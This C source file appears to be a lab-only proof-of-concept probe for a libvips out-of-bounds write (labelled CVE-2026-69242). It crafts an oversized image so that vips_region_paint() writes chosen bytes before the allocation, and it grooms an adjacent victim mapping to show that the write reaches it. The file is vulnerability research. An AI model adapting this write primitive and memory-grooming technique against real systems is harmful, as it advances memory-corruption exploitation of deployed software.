/* Lab-only allocator-neighbour probe for CVE-2026-69242.
 *
 * W4 showed a chosen-byte negative-offset WRITE through the public API
 * vips_region_paint() on a real 8.6 GB libvips allocation, but ASan aborts at
 * the first poisoned byte (allocation base - 6144), 1152 bytes into the
 * 160000-byte memset. This probe asks the structural question on a plain
 * build: what is actually mapped at data - 7296, and can the write be
 * observed in a different live mapping?
 *
 *   layout - print the /proc/self/maps entries around the crafted image and
 *            mincore() status of the page at data - 7296; then paint;
 *   victim - place a 64 KiB anonymous victim mapping immediately below the
 *            crafted image's glibc mmap base, fill it with 0x11, paint with
 *            0x5a, and read back the victim bytes.
 *
 * No wire, command, marker, pointer target or control-flow datum. The victim
 * mapping is explicit grooming: a positive result means the write CAN reach
 * a neighbouring live mapping with chosen bytes, not that one occurs by
 * default.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <vips/vips.h>

#define LINE_SZ 4294960000ULL
#define IMAGE_SZ 8589920000ULL
#define NEG_OFF 7296
#define VICTIM_SZ 65536

static VipsImage *
make_image(void)
{
	VipsImage *im = vips_image_new_memory();

	im->Xsize = 107374;
	im->Ysize = 2;
	im->Bands = 10000;
	im->BandFmt = VIPS_FORMAT_UINT;
	im->Coding = VIPS_CODING_NONE;
	im->Type = VIPS_INTERPRETATION_MULTIBAND;

	if (vips_image_write_prepare(im)) {
		printf("PREPARE=ERR msg=%s\n", vips_error_buffer());
		vips_error_clear();
		g_object_unref(im);
		return NULL;
	}
	printf("IMAGE Xsize=%d Ysize=%d Bands=%d sizeof_line=%llu "
		"sizeof_image=%llu data=%p\n",
		im->Xsize, im->Ysize, im->Bands,
		(unsigned long long) VIPS_IMAGE_SIZEOF_LINE(im),
		(unsigned long long) VIPS_IMAGE_SIZEOF_IMAGE(im),
		(void *) im->data);
	fflush(stdout);
	return im;
}

/* Find the mapping that contains p and print every mapping whose range is
 * within 1 MiB of p. Return the containing mapping's start address. */
static unsigned long
print_nearby_maps(unsigned long p)
{
	FILE *f = fopen("/proc/self/maps", "r");
	char line[512];
	unsigned long containing = 0;
	unsigned long below_hi = 0;
	unsigned long prev_hi = 0;

	if (!f) {
		printf("MAPS=ERR errno=%d\n", errno);
		return 0;
	}
	while (fgets(line, sizeof(line), f)) {
		unsigned long lo, hi;
		if (sscanf(line, "%lx-%lx", &lo, &hi) != 2)
			continue;
		if (p >= lo && p < hi) {
			containing = lo;
			below_hi = prev_hi;
		}
		if ((lo >= p - 1048576 && lo <= p + 1048576) ||
			(hi >= p - 1048576 && hi <= p + 1048576) ||
			(lo < p && hi > p)) {
			char perm[8] = "";
			char tail[256] = "";
			sscanf(line, "%*s %7s %*s %*s %*s %255s", perm, tail);
			printf("MAP %lx-%lx %s %s\n", lo, hi, perm, tail);
		}
		prev_hi = hi;
	}
	fclose(f);
	printf("MAP_CONTAINING=%lx MAP_TARGET=%lx DELTA=%ld\n",
		containing, p - NEG_OFF, (long) (p - NEG_OFF) - (long) containing);
	printf("MAP_NEXT_BELOW_HI=%lx GAP_BELOW=%lu\n",
		below_hi, containing - below_hi);
	fflush(stdout);
	return containing;
}

static void
paint(VipsImage *im)
{
	VipsRegion *reg = vips_region_new(im);
	VipsRect r = { 0, 0, 4, 2 };
	int rc = vips_region_prepare(reg, &r);

	printf("PAINT_PREPARE=%d data=%p bpl=%d lskip=%llu\n",
		rc, (void *) reg->data, reg->bpl,
		(unsigned long long) VIPS_REGION_LSKIP(reg));
	fflush(stdout);
	if (rc != 0 || reg->valid.height < 2) {
		printf("PAINT_SKIP msg=%s\n", vips_error_buffer());
		vips_error_clear();
		g_object_unref(reg);
		return;
	}
	printf("PAINT_ADDR1=%p\n", (void *) VIPS_REGION_ADDR(reg, 0, 1));
	fflush(stdout);
	vips_region_paint(reg, &r, 0x5a);
	printf("PAINT_DONE\n");
	fflush(stdout);
	g_object_unref(reg);
}

int
main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "layout";
	VipsImage *im;
	unsigned long data, map_start, target;
	unsigned char vec[1];

	if (VIPS_INIT(argv[0]))
		return 1;
	if (!(im = make_image()))
		return 0;
	data = (unsigned long) im->data;
	map_start = print_nearby_maps(data);
	target = data - NEG_OFF;

	if (mincore((void *) (target & ~4095UL), 4096, vec) == 0)
		printf("MINCORE_TARGET=1 vec=%02x\n", vec[0]);
	else
		printf("MINCORE_TARGET=0 errno=%d\n", errno);
	fflush(stdout);

	if (!strcmp(mode, "victim") && map_start) {
		unsigned long vb = map_start - VICTIM_SZ;
		unsigned char *victim = mmap((void *) vb, VICTIM_SZ,
			PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
			-1, 0);
		if (victim == MAP_FAILED) {
			printf("VICTIM_MMAP=ERR errno=%d want=%lx\n", errno, vb);
			fflush(stdout);
		}
		else {
			size_t off = target - vb;
			memset(victim, 0x11, VICTIM_SZ);
			printf("VICTIM base=%lx off=%zu pre=%02x\n",
				vb, off, victim[off]);
			fflush(stdout);
			paint(im);
			printf("VICTIM_POST off=%zu byte0=%02x byte1=%02x "
				"before=%02x after_end=%02x\n",
				off, victim[off], victim[off + 1],
				off > 0 ? victim[off - 1] : 0,
				victim[VICTIM_SZ - 1]);
			fflush(stdout);
			/* The paint also overwrote the crafted glibc mmap chunk
			 * header at the mapping base. Normal teardown would abort
			 * on that corruption; the observation is complete. */
			_exit(0);
		}
	}

	paint(im);
	printf("PAINT_RETURNED\n");
	fflush(stdout);
	g_object_unref(im);
	vips_shutdown();
	return 0;
}
